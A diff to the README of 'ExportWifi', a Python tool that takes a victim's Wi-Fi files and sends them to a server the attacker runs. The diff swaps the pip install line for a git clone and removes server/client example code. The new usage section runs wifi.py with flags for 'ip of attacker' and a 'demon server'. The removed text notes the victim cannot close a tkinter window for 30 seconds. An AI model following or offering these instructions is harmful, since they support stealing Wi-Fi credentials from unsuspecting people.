@@ -7,7 +7,7 @@ This a module which imports WI-FI files and detects the current WI-FI name and t
 
 To install ExportWifi simply type:
 
-`pip install ExportWifi`
+`git clone https://github.com/Kill0geR/ExportWifi`
 
 In your Terminal
 
@@ -15,30 +15,22 @@ HOW DOES ExportWifi WORK?
 -------------------------
 The ip address and the port number should be the same so the connection will work
 
+HOW TO USE ExportWifi?
+---------------------
+Change the directory
 
-For Example:
-============
+`cd ExportWifi`
 
-Server
------
-````python
-import ExportWifi as wifi
-
-server = wifi.WlanServer("127.0.0.1", 1234)
-server.start()
-````
-
-Client
-------
-````python
-import ExportWifi as wifi
-
-client = wifi.WlanClient("127.0.0.1", 1234)
-client.start()
-````
-
-The User can't stop tkinter for 30 seconds and is forced to fill everything 
-All the Wi-Fi Files will be saved to your directory where the server is located
+Start "wifi.py" with
+ `python wifi.py -aip 127.0.0.1`
+ 
+ -aip stands for ip of attacker
+ -cf stands for create file
+ -ds stands for demon server and means to have the server in your directory
+ -p stands for ports and displays the port of the attacker
+ 
+ If you need help simply type:
+ `python wifi.py -help`
 
 Output of Server
 ---------------
